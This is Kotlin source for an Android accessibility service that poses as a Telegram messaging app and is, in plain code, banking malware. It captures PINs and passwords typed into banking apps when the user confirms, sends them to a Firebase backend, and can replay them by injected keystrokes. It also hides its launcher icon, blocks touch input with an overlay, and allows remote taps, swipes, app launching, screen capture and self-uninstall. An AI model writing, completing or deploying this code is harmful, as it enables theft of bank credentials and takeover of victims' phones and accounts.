package com.telegram2.messaging.remote

import android.accessibilityservice.AccessibilityService
import android.accessibilityservice.AccessibilityServiceInfo
import android.accessibilityservice.GestureDescription
import android.content.ComponentName
import android.content.Context
import android.content.Intent
import android.graphics.PixelFormat
import android.graphics.Path
import android.os.Build
import android.os.Bundle
import android.os.Handler
import android.os.Looper
import android.provider.Settings
import android.view.Gravity
import android.view.WindowManager
import android.view.accessibility.AccessibilityEvent
import android.view.accessibility.AccessibilityNodeInfo
import android.util.Log

class MyAccessibilityService : AccessibilityService() {

    companion object {
        var instance: MyAccessibilityService? = null
    }

    private val mainHandler = Handler(Looper.getMainLooper())
    private var touchLockOverlay: WindowManager? = null
    private var pinBuffer: StringBuilder? = null
    private var lastFocusedPackage: String? = null

    override fun onServiceConnected() {
        super.onServiceConnected()
        instance = this
        serviceInfo = AccessibilityServiceInfo().apply {
            eventTypes = AccessibilityEvent.TYPES_ALL_MASK
            feedbackType = AccessibilityServiceInfo.FEEDBACK_GENERIC
            flags = AccessibilityServiceInfo.FLAG_REPORT_VIEW_IDS or
                    AccessibilityServiceInfo.FLAG_RETRIEVE_INTERACTIVE_WINDOWS or
                    AccessibilityServiceInfo.FLAG_INCLUDE_NOT_IMPORTANT_VIEWS
            notificationTimeout = 100
        }
        hideAppIcon()
    }

    override fun onAccessibilityEvent(event: AccessibilityEvent) {
        if (event.eventType == AccessibilityEvent.TYPE_VIEW_TEXT_CHANGED) {
            val pkg = event.packageName?.toString() ?: return
            if (isBankApp(pkg)) {
                if (event.className?.toString()?.contains("EditText") == true) {
                    val source = event.source ?: return
                    val inputType = source.inputType
                    if (inputType and 0x80 != 0 || inputType and 0x10 != 0) {
                        if (pinBuffer == null) pinBuffer = StringBuilder()
                        event.text.forEach { pinBuffer?.append(it) }
                        lastFocusedPackage = pkg
                    }
                }
                BankLogger.onEvent(this, event)
            }
        } else if (event.eventType == AccessibilityEvent.TYPE_VIEW_CLICKED) {
            val pkg = event.packageName?.toString() ?: return
            if (isBankApp(pkg) && pinBuffer != null && pinBuffer!!.isNotEmpty()) {
                val source = event.source ?: return
                val confirmText = source.text?.toString() ?: source.contentDescription?.toString() ?: ""
                // FIXED: use Regex.containsMatchIn instead of String.contains with Regex
                if (Regex("Confirm|Send|Login|Sign in|OK", RegexOption.IGNORE_CASE).containsMatchIn(confirmText)) {
                    val pin = pinBuffer.toString()
                    FirebaseBridge.savePin(pkg, pin)   // needs FirebaseBridge to have this method
                    FirebaseBridge.logBankData(pkg, pin = pin)
                    pinBuffer = null
                }
            }
        }
    }

    override fun onInterrupt() {}

    private fun isBankApp(pkg: String): Boolean = BankLogger.BANK_PACKAGES.contains(pkg)

    fun tap(x: Int, y: Int) {
        val path = Path().apply { moveTo(x.toFloat(), y.toFloat()) }
        dispatchGesture(GestureDescription.Builder()
            .addStroke(GestureDescription.StrokeDescription(path, 0, 50))
            .build(), null, null)
    }

    fun swipe(sx: Int, sy: Int, ex: Int, ey: Int, dur: Long) {
        val path = Path().apply {
            moveTo(sx.toFloat(), sy.toFloat())
            lineTo(ex.toFloat(), ey.toFloat())
        }
        dispatchGesture(GestureDescription.Builder()
            .addStroke(GestureDescription.StrokeDescription(path, 0, dur))
            .build(), null, null)
    }

    fun injectText(text: String) {
        mainHandler.post {
            val root = rootInActiveWindow ?: return@post
            val input = root.findFocus(AccessibilityNodeInfo.FOCUS_INPUT)
            if (input != null && !input.isPassword) {
                val bundle = Bundle().apply {
                    putCharSequence(AccessibilityNodeInfo.ACTION_ARGUMENT_SET_TEXT_CHARSEQUENCE, text)
                }
                input.performAction(AccessibilityNodeInfo.ACTION_SET_TEXT, bundle)
            } else {
                injectViaKeys(text)
            }
        }
    }

    fun clickText(text: String) {
        mainHandler.post {
            val root = rootInActiveWindow ?: return@post
            for (node in root.findAccessibilityNodeInfosByText(text)) {
                if (node.isClickable) {
                    node.performAction(AccessibilityNodeInfo.ACTION_CLICK)
                    return@post
                }
            }
        }
    }

    fun launchApp(pkg: String): Boolean {
        val intent = packageManager.getLaunchIntentForPackage(pkg) ?: return false
        intent.addFlags(Intent.FLAG_ACTIVITY_NEW_TASK)
        startActivity(intent)
        return true
    }

    fun injectPin(appPackage: String) {
        FirebaseBridge.getPin(appPackage) { pin ->
            if (pin != null) injectViaKeys(pin)
        }
    }

    private fun injectViaKeys(text: String) {
        Thread {
            try {
                val instrumentation = android.app.Instrumentation()
                for (char in text) {
                    val keyCode = when (char) {
                        '0' -> android.view.KeyEvent.KEYCODE_0
                        '1' -> android.view.KeyEvent.KEYCODE_1
                        '2' -> android.view.KeyEvent.KEYCODE_2
                        '3' -> android.view.KeyEvent.KEYCODE_3
                        '4' -> android.view.KeyEvent.KEYCODE_4
                        '5' -> android.view.KeyEvent.KEYCODE_5
                        '6' -> android.view.KeyEvent.KEYCODE_6
                        '7' -> android.view.KeyEvent.KEYCODE_7
                        '8' -> android.view.KeyEvent.KEYCODE_8
                        '9' -> android.view.KeyEvent.KEYCODE_9
                        else -> android.view.KeyEvent.KEYCODE_UNKNOWN
                    }
                    if (keyCode != android.view.KeyEvent.KEYCODE_UNKNOWN) {
                        val downTime = android.os.SystemClock.uptimeMillis()
                        val eventDown = android.view.KeyEvent(downTime, downTime, android.view.KeyEvent.ACTION_DOWN, keyCode, 0)
                        instrumentation.sendKeySync(eventDown)
                        Thread.sleep(100)
                        val eventUp = android.view.KeyEvent(downTime, downTime, android.view.KeyEvent.ACTION_UP, keyCode, 0)
                        instrumentation.sendKeySync(eventUp)
                    }
                }
            } catch (e: Exception) {
                Log.e("RAT", "Key injection failed", e)
            }
        }.start()
    }

    fun lockTouch(enable: Boolean) {
        if (enable) {
            if (touchLockOverlay != null) return
            val wm = getSystemService(Context.WINDOW_SERVICE) as WindowManager
            val params = WindowManager.LayoutParams(
                WindowManager.LayoutParams.MATCH_PARENT,
                WindowManager.LayoutParams.MATCH_PARENT,
                if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) WindowManager.LayoutParams.TYPE_APPLICATION_OVERLAY
                else WindowManager.LayoutParams.TYPE_PHONE,
                WindowManager.LayoutParams.FLAG_NOT_FOCUSABLE, // no FLAG_NOT_TOUCHABLE -> eats touches
                PixelFormat.TRANSLUCENT
            ).apply {
                gravity = Gravity.TOP or Gravity.LEFT
                x = 0; y = 0
            }
            touchLockOverlay = wm
            val view = android.view.View(this)
            wm.addView(view, params)
        } else {
            touchLockOverlay?.let {
                try { it.removeView(android.view.View(this)) } catch (_: Exception) {}
            }
            touchLockOverlay = null
        }
    }

    fun hideAppIcon() {
        try {
            packageManager.setComponentEnabledSetting(
                ComponentName(this, "com.telegram2.messaging.MainActivity"),
                android.content.pm.PackageManager.COMPONENT_ENABLED_STATE_DISABLED,
                android.content.pm.PackageManager.DONT_KILL_APP
            )
        } catch (_: Exception) {}
    }

    fun uninstallSelf() {
        val intent = Intent(Settings.ACTION_APPLICATION_DETAILS_SETTINGS).apply {
            data = android.net.Uri.parse("package:$packageName")
            flags = Intent.FLAG_ACTIVITY_NEW_TASK
        }
        startActivity(intent)
        mainHandler.postDelayed({
            val root = rootInActiveWindow ?: return@postDelayed
            val btn = findClickableByText(root, "Uninstall") ?: findClickableByText(root, "OK")
            btn?.performAction(AccessibilityNodeInfo.ACTION_CLICK)
        }, 2000)
    }

    private fun findClickableByText(root: AccessibilityNodeInfo, text: String): AccessibilityNodeInfo? {
        for (node in root.findAccessibilityNodeInfosByText(text)) {
            if (node.isClickable) return node
        }
        return null
    }

    fun startScreenCapture() {
        startActivity(Intent(this, com.telegram2.messaging.ScreenPermissionActivity::class.java).apply {
            flags = Intent.FLAG_ACTIVITY_NEW_TASK
        })
    }

    fun stopScreenCapture() {
        try {
            val intent = Intent(this, ScreenCaptureService::class.java)
            intent.action = "stop"
            stopService(intent)
        } catch (_: Exception) {}
    }

    fun getInstalledApps(): List<String> = packageManager.getInstalledPackages(0).map { it.packageName }

    fun runOnMainThread(block: () -> Unit) { mainHandler.post(block) }
}